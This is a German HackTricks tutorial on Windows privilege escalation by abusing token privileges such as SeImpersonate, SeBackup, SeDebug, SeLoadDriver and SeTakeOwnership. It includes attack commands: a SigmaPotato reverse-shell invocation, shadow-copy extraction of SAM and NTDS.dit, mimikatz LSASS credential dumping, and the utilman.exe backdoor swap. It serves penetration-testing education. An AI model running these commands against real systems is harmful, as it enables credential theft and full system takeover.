# Tokens missbrauchen

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Wenn du **nicht weißt, was Windows Access Tokens sind**, lies diese Seite, bevor du fortfährst:


{{#ref}}
access-tokens.md
{{#endref}}

**Möglicherweise kannst du deine Privilegien eskalieren, indem du bereits vorhandene Tokens missbrauchst.**

### SeImpersonatePrivilege

Dieses Privileg ermöglicht es einem Prozess, sich als ein Token auszugeben, jedoch kein Token zu erstellen, wenn er ein Handle für dieses Token erhalten kann. Ein privilegiertes Token kann von einem Windows-Service (DCOM) erlangt werden, indem dieser dazu gebracht wird, eine NTLM-Authentifizierung gegenüber einem Exploit durchzuführen. Dadurch kann anschließend die Ausführung eines Prozesses mit SYSTEM-Privilegien ermöglicht werden.<sup>[[2]](#references)</sup> Dieses Primitive kann mit Tools wie [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wobei WinRM deaktiviert sein muss), [SweetPotato](https://github.com/CCob/SweetPotato) und [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) ausgenutzt werden.

Hinweise für moderne Operatoren:

- **JuicyPotato ist veraltet**: Verwende unter Windows 10 1809+/Server 2019+ bevorzugt **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** oder **PrintSpoofer**, je nachdem, welche RPC-/COM-Schnittstelle noch erreichbar ist.
- Wenn du einen Service kompromittiert hast, der als **`LOCAL SERVICE`** oder **`NETWORK SERVICE`** läuft, und `whoami /priv` ein **gefiltertes Token** ohne `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` anzeigt, stelle zuerst den **standardmäßigen Berechtigungssatz** des Kontos wieder her (beispielsweise mit **FullPowers**) und versuche danach erneut die Potato-Familie.<sup>[[3]](#references)</sup>
- Einige neuere Forks sind für Operatoren benutzerfreundlicher als die ursprünglichen Tools. Beispielsweise fügt **SigmaPotato** Reflection-/In-Memory-Ausführung und Kompatibilität mit modernen Windows-Versionen hinzu, während **PrintNotifyPotato** den PrintNotify-COM-Service missbraucht und häufig nützlich ist, wenn der klassische Spooler-Pfad deaktiviert ist.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es ist **SeImpersonatePrivilege** sehr ähnlich und verwendet dieselbe Methode, um ein privilegiertes Token zu erhalten.\
Dieses Privileg ermöglicht anschließend, **einem neuen oder angehaltenen Prozess ein primäres Token zuzuweisen**. Mit dem privilegierten Impersonation-Token kann ein primäres Token abgeleitet werden (DuplicateTokenEx).\
Mit diesem Token kann ein **neuer Prozess** mit 'CreateProcessAsUser' erstellt oder ein Prozess angehalten und **das Token gesetzt** werden (im Allgemeinen kann das primäre Token eines laufenden Prozesses nicht geändert werden).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Wenn dieses Token aktiviert ist, kann **KERB_S4U_LOGON** verwendet werden, um für jeden anderen Benutzer ein **Impersonation-Token** zu erhalten, ohne die Anmeldedaten zu kennen, dem Token **eine beliebige Gruppe** (Admins) hinzuzufügen, die **Integritätsstufe** des Tokens auf "**medium**" zu setzen und dieses Token dem **aktuellen Thread** zuzuweisen (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Dieses Privileg veranlasst das System, für jede Datei vollständige **Leseberechtigungen** zu gewähren (auf Lesevorgänge beschränkt). Es wird verwendet, um die Passwort-Hashes lokaler **Administrator**-Konten aus der Registry zu lesen. Anschließend können Tools wie "**psexec**" oder "**wmiexec**" mit dem Hash verwendet werden (Pass-the-Hash technique). Diese Technik schlägt jedoch unter zwei Bedingungen fehl: wenn das Konto des lokalen Administrators deaktiviert ist oder wenn eine Richtlinie administrative Rechte für lokale Administratoren entfernt, die sich remote verbinden.<sup>[[2]](#references)</sup>\
In der Praxis ist der zuverlässigste integrierte Workflow normalerweise **VSS + `robocopy /b`**: eine Shadow Copy erstellen und verfügbar machen und anschließend `SAM`/`SYSTEM` oder `NTDS.dit` im **backup mode** kopieren, wodurch die Datei-ACLs umgangen werden.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Du kannst dieses **Privilege** missbrauchen mit:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- indem du **IppSec** auf [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) folgst
- Oder wie im Abschnitt **Eskalation von Privileges mit Backup Operators** erklärt:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Dieses Privilege gewährt **Schreibzugriff** auf jede Systemdatei, unabhängig von der Access Control List (ACL) der Datei. Es eröffnet zahlreiche Möglichkeiten zur Privilege Escalation, darunter die Möglichkeit, **Dienste zu ändern**, DLL Hijacking durchzuführen und über Image File Execution Options **Debugger** festzulegen, sowie verschiedene weitere Techniken.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ist eine mächtige Berechtigung, die besonders nützlich ist, wenn ein Benutzer Tokens impersonieren kann, aber auch dann, wenn SeImpersonatePrivilege nicht vorhanden ist. Diese Fähigkeit hängt davon ab, dass ein Token impersoniert werden kann, das denselben Benutzer repräsentiert und dessen Integrity Level nicht höher ist als das des aktuellen Prozesses.<sup>[[2]](#references)</sup>

**Wichtige Punkte:**

- **Impersonation ohne SeImpersonatePrivilege:** Es ist möglich, SeCreateTokenPrivilege für EoP zu nutzen, indem unter bestimmten Bedingungen Tokens impersoniert werden.
- **Bedingungen für die Token-Impersonation:** Eine erfolgreiche Impersonation setzt voraus, dass das Ziel-Token demselben Benutzer gehört und ein Integrity Level besitzt, das kleiner oder gleich dem Integrity Level des Prozesses ist, der die Impersonation durchführt.
- **Erstellung und Änderung von Impersonation-Tokens:** Benutzer können ein Impersonation-Token erstellen und es erweitern, indem sie die SID (Security Identifier) einer privilegierten Gruppe hinzufügen.

### SeLoadDriverPrivilege

Dieses Privilege ermöglicht einem Prozess das **Laden und Entladen von Gerätetreibern**, indem ein Registry-Eintrag mit bestimmten `ImagePath`- und `Type`-Werten erstellt wird. Da direkter Schreibzugriff auf `HKLM` (HKEY_LOCAL_MACHINE) eingeschränkt ist, kann stattdessen `HKCU` (HKEY_CURRENT_USER) verwendet werden. Es ist jedoch ein bestimmter Pfad erforderlich, damit der Kernel den `HKCU`-Eintrag als Treiberkonfiguration erkennt.<sup>[[2]](#references)</sup>

Die moderne offensive Nutzung erfolgt normalerweise über **BYOVD** (bring your own vulnerable driver): Lade einen **signierten, aber verwundbaren** Kernel-Treiber und verwende anschließend dessen IOCTLs, um Schutzmechanismen zu deaktivieren oder zur Codeausführung im Kernel zu gelangen. Beachte, dass bei aktuellen Windows-11-/Server-Builds die **Microsoft vulnerable driver blocklist** und/oder **HVCI/Memory Integrity** ältere öffentliche Chains häufig verhindern, sodass klassische Beispiele im Stil von `szkg64.sys` nicht mehr universell zuverlässig sind.

Dieser Pfad lautet `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` der Relative Identifier des aktuellen Benutzers ist. Innerhalb von `HKCU` muss dieser gesamte Pfad erstellt und zwei Werte festgelegt werden:<sup>[[2]](#references)</sup>

- `ImagePath`, der Pfad zur auszuführenden Binärdatei
- `Type` mit dem Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Auszuführende Schritte:**

1. Greife aufgrund des eingeschränkten Schreibzugriffs auf `HKCU` statt auf `HKLM` zu.
2. Erstelle den Pfad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` innerhalb von `HKCU`, wobei `<RID>` den Relative Identifier des aktuellen Benutzers darstellt.
3. Setze `ImagePath` auf den Ausführungspfad der Binärdatei.
4. Weise `Type` den Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`) zu.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Weitere Möglichkeiten, dieses Privilege auszunutzen, finden Sie unter [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dies ähnelt **SeRestorePrivilege**. Seine primäre Funktion ermöglicht es einem Prozess, **die Besitzrechte an einem Objekt zu übernehmen**, wodurch die Anforderung eines expliziten diskretionären Zugriffs durch die Gewährung von WRITE_OWNER-Zugriffsrechten umgangen wird. Der Prozess umfasst zunächst die Sicherung der Besitzrechte an dem vorgesehenen Registry-Schlüssel zu Schreibzwecken und anschließend die Änderung der DACL, um Schreibvorgänge zu ermöglichen.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Dieses Privileg erlaubt das **Debuggen anderer Prozesse**, einschließlich des Lesens und Schreibens in deren Speicher. Mit diesem Privileg können verschiedene Strategien für Memory-Injection eingesetzt werden, die die meisten Antivirus- und Host-Intrusion-Prevention-Lösungen umgehen können.<sup>[[2]](#references)</sup>

Bei modernen Windows-Systemen solltest du beachten, dass `SeDebugPrivilege` normalerweise ausreicht, um **nicht geschützte SYSTEM-Prozesse** zu öffnen und deren Tokens zu duplizieren. Es ist jedoch **keine Garantie dafür, dass du LSASS manipulieren kannst**. Wenn **RunAsPPL / LSA Protection** aktiviert ist, können nicht geschützte Prozesse LSASS weder lesen noch injizieren, selbst wenn `SeDebugPrivilege` vorhanden ist. In diesem Fall solltest du ein Token von einem anderen nicht durch PPL geschützten SYSTEM-Prozess stehlen oder einen PPL-Bypass/BYOVD verketten, anstatt davon auszugehen, dass `procdump` funktioniert. Ein vollständiges Beispiel für das Kopieren eines Tokens mit `SeDebugPrivilege` + `SeImpersonatePrivilege` findest du auf [dieser Seite](sedebug-+-seimpersonate-copy-token.md).

#### Speicher dumpen

Du kannst [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aus der [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) verwenden, um **den Speicher eines Prozesses zu erfassen**. Dies kann insbesondere auf den Prozess **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** angewendet werden, der für die Speicherung von Benutzeranmeldedaten verantwortlich ist, sobald sich ein Benutzer erfolgreich an einem System angemeldet hat.

Anschließend kannst du diesen Dump in mimikatz laden, um Passwörter zu erhalten:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Wenn du eine `NT SYSTEM`-Shell erhalten möchtest, kannst du Folgendes verwenden:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Dieses Recht (Volumewartungsaufgaben durchführen) ermöglicht das Öffnen von Handles für Raw-Volume-Geräte (z. B. \\.\C:) für direkte Festplatten-I/O, die NTFS-ACLs umgeht. Damit können Sie die Bytes jeder Datei auf dem Volume durch Lesen der zugrunde liegenden Blöcke kopieren und so beliebige Dateien mit vertraulichen Inhalten lesen (z. B. private Maschinenschlüssel in %ProgramData%\Microsoft\Crypto\, Registry-Hives, SAM/NTDS über VSS).<sup>[[5]](#references)</sup> Dies ist besonders auf CA-Servern wirkungsvoll, da das Exfiltrieren des privaten CA-Schlüssels das Erstellen eines Golden Certificate ermöglicht, um sich als beliebiger Principal auszugeben.<sup>[[6]](#references)</sup>

Siehe detaillierte Techniken und Gegenmaßnahmen:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Berechtigungen prüfen
```
whoami /priv
```
Die **Tokens, die als Disabled angezeigt werden**, können normalerweise aktiviert werden, sodass du häufig sowohl _Enabled_- als auch _Disabled_-Berechtigungen missbrauchen kannst.

### Alle Tokens aktivieren

Wenn du deaktivierte Berechtigungen hast, kannst du das Skript [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) verwenden, um alle Tokens zu aktivieren:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Oder das in diesen [**Post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) eingebettete **Script**.

## Tabelle

Vollständiger Cheatsheet zu Token privileges unter [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); die folgende Zusammenfassung listet nur direkte Wege auf, die privilege auszunutzen, um eine Admin-Session zu erhalten oder sensitive Dateien zu lesen.<sup>[[1]](#references)</sup>

| Privilege                  | Auswirkung      | Tool                    | Ausführungspfad                                                                                                                                                                                                                                                                                                                                     | Hinweise                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Es würde einem Benutzer ermöglichen, Tokens zu impersonieren und mit Tools wie potato.exe, rottenpotato.exe und juicypotato.exe zu nt system zu privescen"_                                                                                                                                                                                                      | Vielen Dank an [Aurélien Chalot](https://twitter.com/Defte_) für das Update. Ich werde bald versuchen, es in eine stärker rezeptartige Form umzuformulieren.                                                                                                                                                                                         |
| **`SeBackup`**             | **Bedrohung**  | _**Built-in commands**_ | Sensitive Dateien mit `robocopy /b` oder speziellen SeBackup-aware copy helpers lesen.                                                                                                                                                                                                                                                                 | <p>- Gut geeignet für `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` und manchmal `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ist praktisch, aber spezielle SeBackup cmdlets/APIs sind für gesperrte/geöffnete Dateien oft flexibler.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Mit `NtCreateToken` ein beliebiges Token einschließlich lokaler Admin-Rechte erstellen.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Ein **nicht-PPL**-SYSTEM-Token duplizieren oder Speicher aus einem nicht geschützten Prozess dumpen.                                                                                                                                                                                                                                                                 | <p>Das Dumpen von LSASS wird häufig blockiert, wenn RunAsPPL/LSA Protection aktiviert ist.</p><p>Script zu finden unter [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Die **Potato family** / Named-Pipe-Impersonation verwenden, um SYSTEM zu starten (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` usw.).                                                                                                                                                                                    | <p>Am praktischsten von Service-Accounts wie IIS APPPOOL, MSSQL, scheduled tasks oder jedem anderen Kontext, der bereits `SeImpersonatePrivilege` besitzt.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Einen signierten, aber verwundbaren Kernel-Treiber (BYOVD) laden<br>2. Die IOCTLs des Treibers verwenden, um Kernel-R/W zu erhalten, Security-Tools zu deaktivieren oder zu SYSTEM zu elevaten<br><br>Alternativ kann die privilege verwendet werden, um Security-bezogene Treiber mit dem `fltMC` builtin command zu entladen, z. B. mit <code>fltMC sysmondrv</code></p>                     | <p>Ältere öffentliche Treiber wie <code>szkg64.sys</code> werden auf modernen Windows-Versionen zunehmend durch die vulnerable-driver blocklist / HVCI blockiert.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. PowerShell/ISE mit vorhandener SeRestore privilege starten.<br>2. Die privilege mit <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> aktivieren).<br>3. utilman.exe in utilman.old umbenennen<br>4. cmd.exe in utilman.exe umbenennen<br>5. Die Konsole sperren und Win+U drücken</p> | <p>Der Angriff kann von bestimmter AV-Software erkannt werden.</p><p>Eine alternative Methode basiert darauf, mit derselben privilege Service-Binaries zu ersetzen, die in "Program Files" gespeichert sind.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe in utilman.exe umbenennen<br>4. Die Konsole sperren und Win+U drücken</p>                                                                                                                                       | <p>Der Angriff kann von bestimmter AV-Software erkannt werden.</p><p>Eine alternative Methode basiert darauf, mit derselben privilege Service-Binaries zu ersetzen, die in "Program Files" gespeichert sind.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Tokens so manipulieren, dass lokale Admin-Rechte enthalten sind. SeImpersonate kann erforderlich sein.</p><p>Muss überprüft werden.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin – Exploitationspfade von Windows privileges zu Admin](https://github.com/gtworek/Priv2Admin)
- [2] [Token Privileges für LPE missbrauchen](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gib mir meine privileges zurück! Bitte?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` Backup-Modus umgeht ACL-Prüfungen für Dateien/Ordner)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume-Wartungsaufgaben durchführen (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA-Key-Exfiltration → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
